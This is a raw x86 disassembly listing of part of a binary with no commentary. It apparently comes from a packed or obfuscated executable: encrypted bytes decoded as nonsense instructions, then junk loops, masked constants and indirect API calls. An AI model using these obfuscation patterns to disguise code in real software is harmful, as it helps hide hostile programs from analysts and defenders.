  40303b:	sub    DWORD PTR [ecx-0xbc99993],eax
  403041:	jae    0x403076
  403043:	call   0xcfb4:0xf8a6c747
  40304a:	adc    eax,0xbb089643
  40304f:	out    dx,eax
  403050:	fiadd  WORD PTR [ecx]
  403052:	mov    ebx,0xcba1e634
  403057:	sub    ch,ah
  403059:	ret    0x8d6b
  40305c:	and    esp,esi
  40305e:	mov    eax,0x146f57d0
  403063:	es (bad) 
  403065:	or     DWORD PTR [ebx-0x3c0273d8],eax
  40306b:	mov    DWORD PTR [ecx+edi*2+0x4c],edi
  40306f:	mov    ebp,0xfcae5c74
  403074:	retf   
  403075:	out    dx,al
  403076:	sbb    esi,DWORD PTR [ebp-0x2bbd62f0]
  40307c:	jb     0x403010
  40307e:	cmc    
  40307f:	xchg   DWORD PTR [ebp-0x23],esi
  403082:	bnd jnp 0x40302c
  403085:	jp     0x4030f6
  403087:	mov    al,ds:0x39c66f65
  40308c:	sub    DWORD PTR [bp+0x6084],esi
  403091:	push   ss
  403092:	push   cs
  403093:	dec    esi
  403094:	jbe    0x403082
  403096:	hlt    
  403097:	or     eax,0x4bff3f88
  40309c:	lahf   
  40309d:	dec    ebx
  40309e:	jp     0x40310b
  4030a0:	xlat   BYTE PTR ds:[ebx]
  4030a1:	lahf   
  4030a2:	fcomp  QWORD PTR [ecx-0x3a46e034]
  4030a8:	fld    st(7)
  4030aa:	lds    eax,FWORD PTR ds:0x16c6d8c0
  4030b0:	pop    ss
  4030b1:	sbb    bl,BYTE PTR [edx+0x1c]
  4030b4:	iret   
  4030b5:	mov    ebx,0xe0f750f0
  4030ba:	add    DWORD PTR [edx+edi*1],ecx
  4030bd:	and    eax,0x85b9cfc7
  4030c2:	jns    0x403104
  4030c4:	repnz mov esi,0x307f9f93
  4030ca:	popa   
  4030cb:	lods   al,BYTE PTR ds:[esi]
  4030cc:	stc    
  4030cd:	sub    edi,esp
  4030cf:	dec    ebp
  4030d0:	loope  0x40307d
  4030d2:	fnsave [ebx-0x5a706209]
  4030d8:	mov    eax,ds:0x5835ec58
  4030dd:	jmp    0x116d5528
  4030e2:	or     esp,esi
  4030e4:	les    esi,FWORD PTR [ebx]
  4030e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030e7:	outs   dx,DWORD PTR ds:[esi]
  4030e9:	add    DWORD PTR [esi-0xb],esi
  4030ec:	jmp    0xb951e542
  4030f1:	(bad)  
  4030f2:	fdivrp st(6),st
  4030f4:	addr16 mov esp,esp
  4030f7:	xor    eax,0xc5def5ce
  4030fc:	mov    ?,WORD PTR [ecx+0x6c2338ad]
  403102:	xor    eax,0x3ac13886
  403107:	les    ebp,FWORD PTR [ecx+edx*8]
  40310a:	jl     0x403153
  40310c:	cli    
  40310d:	or     ah,BYTE PTR [ebx+0x5c014aab]
  403113:	inc    DWORD PTR [edx+eiz*8]
  403116:	fcmovnu st,st(5)
  403118:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40311a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40311b:	rcr    DWORD PTR [edi+0x47],cl
  40311e:	pop    DWORD PTR [edx+0x6]
  403121:	(bad)  
  403122:	jle    0x403115
  403124:	xor    al,0xda
  403126:	dec    edx
  403127:	scas   al,BYTE PTR es:[edi]
  403128:	xchg   ecx,eax
  403129:	outs   dx,BYTE PTR ds:[esi]
  40312a:	inc    edi
  40312b:	push   esp
  40312c:	cmp    al,0x78
  40312e:	mov    cl,0xf7
  403130:	jmp    0x81ea7471
  403135:	push   edi
  403136:	sti    
  403137:	(bad)  
  403138:	jnp    0x4030cf
  40313a:	outs   dx,BYTE PTR ds:[esi]
  40313b:	sub    bh,BYTE PTR [eax+0x4ae7621a]
  403141:	int3   
  403142:	inc    esi
  403143:	(bad)  
  403144:	xor    cl,BYTE PTR [edx+0x1340700d]
  40314a:	clc    
  40314b:	or     eax,0x39181dae
  403150:	loopne 0x4030de
  403152:	bound  esp,QWORD PTR [esi]
  403154:	pop    esp
  403155:	xchg   ecx,eax
  403156:	add    cl,dl
  403158:	pop    eax
  403159:	cli    
  40315a:	xchg   ebx,eax
  40315b:	test   BYTE PTR [edx-0x365972cd],bl
  403161:	mov    ecx,0x2b3993e1
  403166:	mov    cl,0x9e
  403168:	mov    cs,eax
  40316a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40316b:	lock mov esp,0x5397fdd3
  403171:	xor    esi,eax
  403173:	jne    0x403139
  403175:	je     0x403120
  403177:	xchg   ebx,eax
  403178:	scas   eax,DWORD PTR es:[edi]
  403179:	sub    al,0x55
  40317b:	xor    BYTE PTR [ecx],bl
  40317d:	push   es
  40317e:	and    bl,BYTE PTR [edx+0x72]
  403181:	add    eax,0xcc58bd89
  403186:	aaa    
  403187:	inc    edi
  403188:	jae    0x403128
  40318a:	or     esp,edi
  40318c:	xchg   ebx,eax
  40318d:	mov    BYTE PTR [ebp-0x10d1a1ae],ah
  403193:	mov    ch,0x5d
  403195:	mov    BYTE PTR [ebx+0x3d],0x7c
  403199:	out    dx,eax
  40319a:	std    
  40319b:	mov    WORD PTR [esi+0x6],?
  40319e:	sbb    esp,DWORD PTR [ebx-0x7e]
  4031a1:	lods   eax,DWORD PTR ds:[esi]
  4031a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031a3:	shr    DWORD PTR [eax-0x5c],1
  4031a6:	jno    0x4031ed
  4031a8:	sbb    bh,BYTE PTR ds:[edx-0x44]
  4031ac:	push   edx
  4031ad:	jmp    0xceebf858
  4031b2:	push   es
  4031b3:	aaa    
  4031b4:	jo     0x403168
  4031b6:	push   ebx
  4031b7:	or     eax,0x396cb5e
  4031bc:	add    edx,esp
  4031be:	arpl   si,di
  4031c0:	inc    ecx
  4031c1:	mov    WORD PTR [eax-0x5a],fs
  4031c4:	out    0x28,eax
  4031c6:	(bad)  
  4031c7:	mov    DWORD PTR [edx+0x629f1032],ebp
  4031cd:	aad    0x69
  4031cf:	pop    ecx
  4031d0:	rcr    bh,0x9c
  4031d3:	out    dx,eax
  4031d4:	cmp    esp,ebx
  4031d6:	jmp    0x96e:0xa37161b7
  4031dd:	test   DWORD PTR [edx+0x12],ebx
  4031e0:	add    dl,al
  4031e2:	sub    dh,BYTE PTR [ebp-0x74]
  4031e5:	sub    BYTE PTR [esi+0x36cbbc3a],bh
  4031eb:	mov    ds:0xb24e2608,eax
  4031f0:	pop    ebp
  4031f1:	push   0x3c8c02d6
  4031f6:	rcl    BYTE PTR [ecx],1
  4031f8:	push   esi
  4031f9:	sbb    ch,al
  4031fb:	jmp    0x1b4c:0x60409cf6
  403202:	daa    
  403203:	pop    esp
  403204:	jne    0x4031bf
  403206:	mov    bh,0xe6
  403208:	fist   DWORD PTR [edi+eax*1-0x41]
  40320c:	sub    esi,edx
  40320e:	cwde   
  40320f:	les    edi,FWORD PTR [ecx-0x1fd6757d]
  403215:	mov    ebp,0xcfaf6530
  40321a:	mov    esi,0xdce7524e
  40321f:	push   0xd3846915
  403224:	or     BYTE PTR [ecx-0x32],al
  403227:	mov    dl,0xe3
  403229:	xor    DWORD PTR [edx+eiz*4+0x520b6a55],edx
  403230:	xchg   eax,esi
  403232:	mov    edi,DWORD PTR [eax+0x39]
  403235:	add    ah,BYTE PTR [eax+ebx*1]
  403238:	or     edi,ecx
  40323a:	ja     0x403215
  40323c:	out    dx,eax
  40323d:	cs mov bl,0x6c
  403240:	xchg   edi,eax
  403241:	inc    dl
  403243:	sub    dh,BYTE PTR [ebp-0x12]
  403246:	in     al,dx
  403247:	mov    al,0x8e
  403249:	mov    esp,0xfe3f87d8
  40324e:	cmc    
  40324f:	and    DWORD PTR [edi-0x514639f9],0x39
  403256:	ffree  st(5)
  403258:	mov    al,ds:0x197677bf
  40325d:	(bad)  
  40325e:	outs   dx,DWORD PTR ds:[esi]
  40325f:	mov    eax,ds:0x93232afe
  403264:	fsubr  st(4),st
  403266:	lds    esp,FWORD PTR ds:0xde1c8c4b
  40326c:	jae    0x4032e5
  40326e:	fs sub al,0x99
  403271:	inc    ebx
  403272:	dec    ebx
  403273:	jne    0x403288
  403275:	shr    DWORD PTR [ecx],1
  403277:	fidivr WORD PTR [ebp+0x43cf4360]
  40327d:	or     esi,DWORD PTR [ebx+0x344bf834]
  403283:	outs   dx,BYTE PTR ds:[esi]
  403284:	jl     0x403270
  403286:	aad    0xcb
  403288:	fsubp  st(5),st
  40328a:	cmp    BYTE PTR [esi],dh
  40328c:	or     dl,dh
  40328e:	sub    DWORD PTR [edx],ebx
  403290:	cmp    al,0x5b
  403292:	loope  0x403293
  403294:	pop    esi
  403295:	and    esp,DWORD PTR cs:[esi]
  403298:	mov    ds:0xfc550301,eax
  40329d:	popf   
  40329e:	icebp  
  40329f:	inc    ebp
  4032a0:	retf   
  4032a1:	mov    bl,BYTE PTR [edx+0x14]
  4032a4:	rcl    DWORD PTR [edi+0x47],cl
  4032a7:	push   cs
  4032a8:	ret    
  4032a9:	lahf   
  4032aa:	call   0x534b:0x2c260365
  4032b1:	inc    eax
  4032b2:	inc    edi
  4032b3:	data16 and al,0x28
  4032b6:	jecxz  0x403270
  4032b8:	adc    ch,BYTE PTR [edx-0x1dbc44f9]
  4032be:	enter  0x6b86,0x5a
  4032c2:	xor    DWORD PTR [esi+edx*4],eax
  4032c5:	jnp    0x40324e
  4032c7:	outs   dx,BYTE PTR ds:[esi]
  4032c9:	xchg   esp,eax
  4032ca:	mov    bl,0x45
  4032cc:	stos   BYTE PTR es:[edi],al
  4032cd:	jg     0x40325c
  4032cf:	cmp    DWORD PTR [edx-0x70eecc6f],ebx
  4032d5:	inc    ebp
  4032d6:	cli    
  4032d7:	mov    bl,0x8f
  4032d9:	xor    eax,0xc3b6f2c8
  4032de:	ja     0x40332d
  4032e0:	js     0x403328
  4032e2:	les    esp,FWORD PTR [ecx+0x25]
  4032e5:	cld    
  4032e6:	les    ebx,FWORD PTR ds:0x6410acff
  4032ec:	xor    BYTE PTR [edx+0x47],al
  4032ef:	rol    DWORD PTR [edx+0x4],1
  4032f2:	or     edi,DWORD PTR [ecx]
  4032f4:	and    DWORD PTR [ebp-0x69986415],ebx
  4032fa:	or     BYTE PTR [ecx],ah
  4032fc:	sub    al,bl
  4032fe:	mov    es,edx
  403300:	or     eax,0x1828c493
  403305:	stos   WORD PTR es:[edi],ax
  403307:	push   ds
  403308:	inc    esi
  403309:	imul   edi
  40330b:	mov    cl,0x7e
  40330d:	add    DWORD PTR [ebx],0x2b
  403310:	mov    eax,ds:0xab0f8e43
  403315:	hlt    
  403316:	mov    ds:0xf155a9fb,al
  40331b:	xchg   esp,eax
  40331c:	bnd jmp 0xf2995c70
  403322:	pop    ds
  403323:	sub    ch,BYTE PTR [edx]
  403325:	push   cs
  403326:	std    
  403327:	add    BYTE PTR [ebx+0x133da749],bl
  40332d:	fcomp  QWORD PTR [esi-0x78]
  403330:	fcom   st(2)
  403332:	lock std 
  403334:	imul   edx,DWORD PTR [eax+0xf],0x6948ab9c
  40333b:	add    eax,0x1dab031
  403340:	jno    0x403367
  403342:	enter  0x99e5,0x41
  403346:	pushf  
  403347:	xchg   ecx,eax
  403348:	into   
  403349:	cs inc esp
  40334b:	xor    DWORD PTR [ebx+0x11d997b3],esi
  403351:	ss adc bh,0x4b
  403355:	add    esi,eax
  403357:	and    al,0x21
  403359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40335a:	mov    al,0x2f
  40335c:	jmp    0x403302
  40335e:	sub    eax,0xab3b71c
  403363:	mov    ah,0x67
  403365:	mov    ebx,esi
  403367:	ret    0x2b68
  40336a:	mov    eax,ds:0x6528a548
  40336f:	pop    esp
  403370:	jae    0x40331f
  403372:	int    0x23
  403374:	sub    ah,BYTE PTR [ebx-0x11]
  403377:	repz xor cl,bl
  40337a:	adc    BYTE PTR [esi-0x602b0c53],cl
  403380:	repz inc esp
  403382:	mov    BYTE PTR [esi+0x6dbff7c9],bh
  403388:	popa   
  403389:	fild   WORD PTR [edi+0x5f]
  40338c:	cmp    bl,BYTE PTR [ebp-0x1219143]
  403392:	retf   
  403393:	int3   
  403394:	cli    
  403395:	sbb    al,0x33
  403397:	mov    esi,0xa5a68157
  40339c:	add    al,0x39
  40339e:	loope  0x40335c
  4033a0:	je     0x403328
  4033a2:	mov    esi,0xa8e7d2c2
  4033a7:	(bad)  
  4033a8:	mov    al,ds:0xeb8fca84
  4033ad:	popa   
  4033ae:	ins    DWORD PTR es:[edi],dx
  4033af:	dec    eax
  4033b0:	sbb    al,0xd5
  4033b2:	mov    edi,0x5d9db73b
  4033b7:	jle    0x403355
  4033b9:	test   al,0xcc
  4033bb:	outs   dx,DWORD PTR ds:[esi]
  4033bc:	xchg   esi,eax
  4033bd:	ret    0x70e1
  4033c0:	nop
  4033c1:	hlt    
  4033c2:	stc    
  4033c3:	add    bh,BYTE PTR [eax]
  4033c5:	sbb    ah,BYTE PTR [edx-0x34d684b0]
  4033cb:	mov    WORD PTR [ecx],cs
  4033cd:	or     al,0x60
  4033cf:	jg     0x4033cf
  4033d1:	arpl   WORD PTR [ebp+0xff10385],sp
  4033d7:	pop    ebp
  4033d8:	xlat   BYTE PTR ds:[ebx]
  4033d9:	push   0x303ca952
  4033de:	xor    DWORD PTR [edi-0x521ff8b6],ecx
  4033e4:	(bad)  [ebx-0x11]
  4033e7:	cmp    bh,BYTE PTR [esi]
  4033e9:	mov    ds:0xb1a528ea,al
  4033ee:	jae    0x40340a
  4033f0:	neg    edx
  4033f2:	das    
  4033f3:	inc    edx
  4033f4:	in     eax,dx
  4033f5:	pop    eax
  4033f6:	mov    ch,0x6b
  4033f8:	fs daa 
  4033fa:	icebp  
  4033fb:	pop    ebx
  4033fc:	jl     0x40342a
  4033fe:	mov    bl,0x14
  403400:	lahf   
  403401:	xor    dh,0xe7
  403404:	loop   0x403481
  403406:	sub    eax,0x63670ee
  40340b:	repnz sti 
  40340d:	scas   al,BYTE PTR es:[edi]
  40340e:	gs inc esi
  403410:	push   ebp
  403411:	xchg   DWORD PTR [ebx+0x11147f02],ebx
  403417:	cdq    
  403418:	xor    eax,0x79d4a8b7
  40341d:	(bad)  
  40341e:	xchg   edi,eax
  40341f:	jp     0x4033c1
  403421:	fimul  WORD PTR [edi+0x32ad9bcf]
  403427:	popa   
  403428:	add    ebx,DWORD PTR [edx]
  40342a:	adc    edi,DWORD PTR [ecx]
  40342c:	(bad)  
  40342d:	out    0xcd,eax
  40342f:	mov    esi,0x364fa7a
  403434:	mov    DWORD PTR [ecx-0x71],ecx
  403437:	or     DWORD PTR [ebx-0x69],esp
  40343a:	ins    DWORD PTR es:[edi],dx
  40343b:	jnp    0x40341c
  40343d:	pop    esp
  40343e:	xor    eax,0x3d9820d6
  403443:	xchg   BYTE PTR [ebp+ecx*1-0x9831647],dl
  40344a:	and    BYTE PTR [edx],dl
  40344c:	cmc    
  40344d:	pop    edx
  40344e:	push   esp
  40344f:	cmp    esi,edx
  403451:	retf   
  403452:	mov    ds:0xd0fad93f,al
  403457:	sbb    BYTE PTR [edx],cl
  403459:	jns    0x4033e1
  40345b:	ret    
  40345c:	pop    eax
  40345d:	or     DWORD PTR [ebx+eiz*1],0xffffffa6
  403461:	test   al,0x2e
  403463:	(bad)  [eax]
  403465:	cli    
  403466:	cmp    al,0x23
  403468:	iret   
  403469:	call   0xb66e4633
  40346e:	js     0x4034de
  403470:	mov    cs,WORD PTR [ebp-0x2b34ac62]
  403476:	xchg   edi,eax
  403477:	pusha  
  403478:	add    edi,ebx
  40347a:	cmp    al,BYTE PTR [eax]
  40347c:	push   ebp
  40347d:	ds stc 
  40347f:	sbb    bl,BYTE PTR [esi-0x62]
  403482:	ficomp WORD PTR [ebx+edx*8]
  403485:	retf   0x88d9
  403488:	push   edx
  403489:	pop    esi
  40348a:	xor    al,0x4d
  40348c:	push   ebp
  40348d:	imul   ebx,DWORD PTR [edi+0xb8b4f30],0x71edb696
  403497:	dec    ebx
  403498:	mov    esp,0xb6abe164
  40349d:	mov    ch,0xf5
  40349f:	xor    al,0xc9
  4034a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034a3:	cmp    BYTE PTR [eax],ah
  4034a5:	or     bl,BYTE PTR [ebx-0x150a1242]
  4034ab:	cmp    eax,0x4f621d1a
  4034b0:	push   cs
  4034b1:	or     al,0x8f
  4034b3:	loope  0x403523
  4034b5:	ja     0x403504
  4034b7:	add    eax,0xf70d6d5e
  4034bc:	or     dh,dl
  4034be:	jmp    0x403459
  4034c0:	jns    0x4034b0
  4034c2:	int    0xec
  4034c4:	shl    DWORD PTR [edi-0x2a],cl
  4034c7:	push   eax
  4034c8:	das    
  4034c9:	and    eax,0xe86e4b0f
  4034ce:	repnz sub al,0x6f
  4034d1:	mov    ah,0x3d
  4034d3:	imul   ebx,DWORD PTR [eax-0x6b1651e7],0x3f0581dd
  4034dd:	orps   xmm7,XMMWORD PTR [esi]
  4034e0:	xchg   ebx,eax
  4034e1:	jmp    0xe609:0x6c847ab4
  4034e8:	pop    esp
  4034e9:	retf   
  4034ea:	fcom   QWORD PTR [ecx-0x6eb8a03b]
  4034f0:	loopne 0x4034cf
  4034f2:	sbb    al,0x5c
  4034f4:	cmp    ecx,esi
  4034f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4034f7:	out    dx,eax
  4034f8:	ret    
  4034f9:	ds or  al,0x76
  4034fc:	(bad)  
  4034fd:	push   esi
  4034fe:	xchg   ebx,eax
  4034ff:	shl    ebx,0xe1
  403502:	push   ds
  403503:	push   esp
  403504:	push   0x47398cf
  403509:	dec    edx
  40350a:	test   DWORD PTR [ebx+0x47],ecx
  40350d:	ins    BYTE PTR es:[edi],dx
  40350e:	shl    ah,1
  403510:	inc    eax
  403511:	mov    esi,DWORD PTR [esp+edi*1-0x6749873f]
  403518:	xchg   edx,eax
  403519:	in     eax,0x83
  40351b:	cs or  al,0x36
  40351e:	add    al,0xe0
  403520:	fld    QWORD PTR ds:0xb66cc4f4
  403526:	loop   0x40351d
  403528:	ret    
  403529:	xor    BYTE PTR [eax+0x4280b0d4],ah
  40352f:	iret   
  403530:	out    dx,al
  403531:	sti    
  403532:	jmp    0xca1b3e76
  403537:	inc    esp
  403538:	daa    
  403539:	pop    esi
  40353a:	aad    0x8c
  40353c:	adc    esp,DWORD PTR [eax-0x790d65b]
  403542:	xor    eax,0x85635722
  403547:	add    DWORD PTR [esi+0x78b954f2],edi
  40354d:	or     al,0x4d
  40354f:	shr    DWORD PTR [ecx+0x1d84b860],cl
  403555:	and    ch,BYTE PTR [bx-0x40]
  403559:	int3   
  40355a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40355b:	icebp  
  40355c:	sbb    al,0xb8
  40355e:	adc    edx,DWORD PTR [edx-0x5d8a1901]
  403564:	jl     0x4035ba
  403566:	push   ss
  403567:	(bad)  
  403568:	aas    
  403569:	push   0xd7653196
  40356e:	ins    DWORD PTR es:[edi],dx
  40356f:	sub    al,0x3d
  403571:	sbb    eax,0x585daf44
  403576:	test   BYTE PTR [ebp+ecx*1-0x41aac52],dh
  40357d:	or     al,0x16
  40357f:	lds    edi,FWORD PTR [eax+0x1c2c48fe]
  403585:	sbb    bl,BYTE PTR [edi-0x69]
  403588:	fwait
  403589:	push   ds
  40358a:	xor    BYTE PTR [ecx-0x1e],bl
  40358d:	push   edx
  40358e:	dec    edx
  40358f:	cmc    
  403590:	in     al,dx
  403591:	sub    BYTE PTR [edi],ah
  403593:	mov    cl,0xcb
  403595:	push   0x4
  403597:	pop    ecx
  403598:	and    DWORD PTR ds:0x428e5d,0x744e
  4035a2:	sub    ecx,eax
  4035a4:	and    DWORD PTR ds:0x428e5d,0x0
  4035ae:	mov    eax,ds:0x428e5d
  4035b3:	inc    eax
  4035b4:	mov    ds:0x428e5d,eax
  4035b9:	cmp    DWORD PTR ds:0x428e5d,0x1f
  4035c0:	jge    0x4035e8
  4035c6:	jmp    0x4035db
  4035cb:	push   0x7a18
  4035d0:	push   0x1440
  4035d5:	call   DWORD PTR ds:0x42ca1c
  4035db:	cmp    DWORD PTR ds:0x428e5d,0x1b
  4035e2:	jb     0x4035ae
  4035e8:	add    ecx,DWORD PTR [ebp-0x1c]
  4035eb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f9
  4035f2:	and    DWORD PTR ds:0x428e89,0x0
  4035fc:	mov    eax,ds:0x428e89
  403601:	inc    eax
  403602:	mov    ds:0x428e89,eax
  403607:	cmp    DWORD PTR ds:0x428e89,0x25
  40360e:	jb     0x403631
  403614:	jmp    0x403624
  403619:	push   0x5d03
  40361e:	call   DWORD PTR ds:0x42ca50
  403624:	cmp    DWORD PTR ds:0x428e89,0x1d
  40362b:	jb     0x4035fc
  403631:	mov    DWORD PTR [ebp-0x18],ecx
  403634:	mov    eax,ds:0x4292f5
  403639:	mov    eax,DWORD PTR [eax]
  40363b:	or     DWORD PTR ds:0x428e99,eax
  403641:	mov    DWORD PTR [ebp-0xa0],0xf89c85bd
  40364b:	and    DWORD PTR ds:0x428e29,0x0
  403655:	jmp    0x403665
  40365a:	mov    eax,ds:0x428e29
  40365f:	inc    eax
  403660:	mov    ds:0x428e29,eax
  403665:	cmp    DWORD PTR ds:0x428e29,0x13
  40366c:	jae    0x4036b6
  403672:	cmp    DWORD PTR ds:0x428e29,0x6
  403679:	jge    0x4036b6
  40367f:	jmp    0x403699
  403684:	push   0x4646
  403689:	push   0x428124
  40368e:	push   0x428ec1
  403693:	call   DWORD PTR ds:0x42ca54
  403699:	cmp    DWORD PTR ds:0x428e29,0x5
  4036a0:	jne    0x4036b1
  4036a6:	mov    eax,ds:0x428e29
  4036ab:	inc    eax
  4036ac:	mov    ds:0x428e29,eax
  4036b1:	jmp    0x40365a
  4036b6:	mov    eax,DWORD PTR [ebp-0x14]
  4036b9:	mov    DWORD PTR [ebp-0x9c],eax
  4036bf:	mov    eax,DWORD PTR [ebp-0x18]
  4036c2:	or     DWORD PTR ds:0x428e99,0x71ca
  4036cc:	mov    DWORD PTR [ebp-0x98],eax
  4036d2:	movzx  eax,WORD PTR ds:0x428e2d
  4036d9:	sub    DWORD PTR ds:0x428e8d,eax
  4036df:	mov    eax,DWORD PTR [ebp-0x2c]
  4036e2:	xor    eax,esi
  4036e4:	xor    DWORD PTR ds:0x428ec9,0x428e59
  4036ee:	add    eax,edi
  4036f0:	mov    DWORD PTR [ebp-0x94],eax
  4036f6:	lea    eax,[ebp-0x48]
  4036f9:	mov    DWORD PTR [ebp-0x90],eax
  4036ff:	adc    eax,0x53e7
  403704:	mov    eax,DWORD PTR [ebp-0xa0]
  40370a:	adc    DWORD PTR ds:0x428e2d,0x2edb
  403714:	xor    eax,esi
  403716:	sbb    DWORD PTR ds:0x428ed1,0x428e95
  403720:	add    eax,edi
  403722:	or     DWORD PTR ds:0x428e25,0x5a5f
  40372c:	mov    DWORD PTR [ebp-0xa0],eax
  403732:	not    DWORD PTR ds:0x428e49
  403738:	lea    eax,[ebp-0xa0]
  40373e:	push   eax
  40373f:	adc    DWORD PTR ds:0x428ea9,edx
  403745:	mov    eax,DWORD PTR [ebp+0xc]
  403748:	or     DWORD PTR ds:0x428e59,0x428e79
  403752:	xor    eax,esi
  403754:	or     DWORD PTR ds:0x428e81,0x24f1
  40375e:	add    eax,edi
  403760:	or     DWORD PTR ds:0x428e75,0x428e65
  40376a:	push   eax
  40376b:	or     eax,DWORD PTR ds:0x428e55
  403771:	mov    eax,ds:0x428385
  403776:	push   0x4282db
  40377b:	push   DWORD PTR [eax]
  40377d:	call   0x40854d
  403782:	and    eax,0x5bd3
  403787:	mov    ebx,DWORD PTR [ebp-0x14]
  40378a:	movzx  edx,BYTE PTR ds:0x428ed1
  403791:	sbb    edx,DWORD PTR ds:0x428e79
  403797:	mov    DWORD PTR ds:0x428ed1,edx
  40379d:	mov    eax,DWORD PTR [ebp-0x18]
  4037a0:	mov    DWORD PTR [ebp-0x58],eax
  4037a3:	mov    DWORD PTR [ebp-0x34],0xf89c8523
  4037aa:	mov    eax,0xf89c85bb
  4037af:	mov    DWORD PTR [ebp-0x1c],eax
  4037b2:	lea    ecx,[eax-0x2]
  4037b5:	or     DWORD PTR ds:0x428ea1,0x10a8
  4037bf:	mov    DWORD PTR [ebp-0x28],ecx
  4037c2:	sub    edx,0x6e70
  4037c8:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4037cf:	movzx  edx,WORD PTR ds:0x428e7d
  4037d6:	sbb    DWORD PTR ds:0x428e4d,edx
  4037dc:	mov    DWORD PTR [ebp-0x8],eax
  4037df:	sbb    eax,DWORD PTR ds:0x428e2d
  4037e5:	mov    eax,DWORD PTR [ebp-0x10]
  4037e8:	and    DWORD PTR ds:0x428eb9,0x0
  4037f2:	jmp    0x403804
  4037f7:	mov    edx,DWORD PTR ds:0x428eb9
  4037fd:	inc    edx
  4037fe:	mov    DWORD PTR ds:0x428eb9,edx
  403804:	cmp    DWORD PTR ds:0x428eb9,0x14
  40380b:	jae    0x403852
  403811:	cmp    DWORD PTR ds:0x428eb9,0xc
  403818:	jb     0x403852
  40381e:	jmp    0x403833
  403823:	push   0x428019
  403828:	push   0x7b14
  40382d:	call   DWORD PTR ds:0x42ca20
  403833:	cmp    DWORD PTR ds:0x428eb9,0xb
  40383a:	jne    0x40384d
  403840:	mov    edx,DWORD PTR ds:0x428eb9
  403846:	inc    edx
  403847:	mov    DWORD PTR ds:0x428eb9,edx
  40384d:	jmp    0x4037f7
  403852:	xor    eax,esi
  403854:	mov    edx,0xffcd8d88
  403859:	add    DWORD PTR ds:0x428eb1,0x428ec1
  403863:	sub    edx,eax
  403865:	mov    DWORD PTR ds:0x428e39,0x1fc
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  403879:	mov    DWORD PTR ds:0x428ea5,ebx
  40387f:	mov    eax,DWORD PTR [ebp-0x8]
  403882:	mov    DWORD PTR ds:0x428ec9,0x6695
  40388c:	mov    DWORD PTR [ebp-0x3c],ebx
  40388f:	cmp    eax,ecx
  403891:	mov    DWORD PTR ds:0x428e8d,0x71c
  40389b:	je     0x403bca
  4038a1:	mov    eax,DWORD PTR [ebp-0x10]
  4038a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4038a7:	xor    eax,esi
  4038a9:	xor    ecx,esi
  4038ab:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4038b2:	and    DWORD PTR ds:0x428e81,0x0
  4038bc:	jmp    0x4038cf
  4038c1:	xor    eax,eax
  4038c3:	add    eax,DWORD PTR ds:0x428e81
  4038c9:	inc    eax
  4038ca:	mov    ds:0x428e81,eax
  4038cf:	cmp    DWORD PTR ds:0x428e81,0x11
  4038d6:	jae    0x403909
  4038dc:	cmp    DWORD PTR ds:0x428e81,0x1e
  4038e3:	jg     0x403909
  4038e9:	jmp    0x403904
  4038ee:	push   0x6b74
  4038f3:	push   DWORD PTR [ebp-0x10]
  4038f6:	push   DWORD PTR [ebp-0x1c]
  4038f9:	push   0x7d9c
  4038fe:	call   DWORD PTR ds:0x42ca58
  403904:	jmp    0x4038c1
  403909:	mov    eax,DWORD PTR [ebp-0xc]
  40390c:	xor    edx,edx
  40390e:	or     DWORD PTR ds:0x428eb9,0x5ac4
  403918:	div    ecx
  40391a:	mov    eax,DWORD PTR [ebp-0x8]
  40391d:	sbb    DWORD PTR ds:0x428e55,0x2d6
  403927:	mov    ecx,DWORD PTR [ebp-0x10]
  40392a:	and    DWORD PTR ds:0x428e8d,0x428e9d
  403934:	xor    eax,esi
  403936:	xor    ecx,esi
  403938:	sub    eax,ecx
  40393a:	mov    DWORD PTR ds:0x428ec5,0x3e75
  403944:	cmp    edx,eax
  403946:	mov    DWORD PTR ds:0x428e2d,0x53e
  403950:	jne    0x403b0b
  403956:	mov    eax,DWORD PTR [ebp-0xc]
  403959:	xor    DWORD PTR ds:0x428e45,ebx
  40395f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403966:	sub    ecx,0x200f
  40396c:	mov    eax,DWORD PTR [ebp-0x28]
  40396f:	or     ecx,DWORD PTR ds:0x428e5d
  403975:	mov    ecx,DWORD PTR [ebp-0x18]
  403978:	xor    eax,esi
  40397a:	xor    ecx,esi
  40397c:	sbb    DWORD PTR ds:0x428e8d,0x428ead
  403986:	add    eax,edi
  403988:	sbb    DWORD PTR ds:0x428e45,0x428ec9
  403992:	add    ecx,edi
  403994:	mov    BYTE PTR [ebp-0x21],dl
  403997:	mov    DWORD PTR ds:0x428ea5,0x17c
  4039a1:	cmp    eax,ecx
  4039a3:	jae    0x403a98
  4039a9:	xor    edx,0x3299
  4039af:	lea    ecx,[eax-0x3272f8]
  4039b5:	mov    DWORD PTR [ebp-0x14],ecx
  4039b8:	mov    edx,DWORD PTR [ebp-0x14]
  4039bb:	xor    edx,esi
  4039bd:	add    edx,0x7f55d8fb
  4039c3:	lea    ecx,[ebp+eax*4-0xb4]
  4039ca:	mov    DWORD PTR ds:0x428e59,0x12ce
  4039d4:	mov    DWORD PTR [ecx],edx
  4039d6:	mov    edx,DWORD PTR ds:0x428e95
  4039dc:	mov    edx,DWORD PTR [ecx]
  4039de:	cmp    edx,0x244ecb9a
  4039e4:	mov    DWORD PTR ds:0x428e99,0x3868
  4039ee:	jbe    0x403a09
  4039f4:	add    DWORD PTR ds:0x428ea1,0x428e75
  4039fe:	add    DWORD PTR [ecx],0x405fcdd
  403a04:	jmp    0x403a15
  403a09:	dec    DWORD PTR ds:0x428e99
  403a0f:	add    DWORD PTR [ecx],0xfdaf4323
  403a15:	and    DWORD PTR ds:0x428ea5,0x0
  403a1f:	jmp    0x403a31
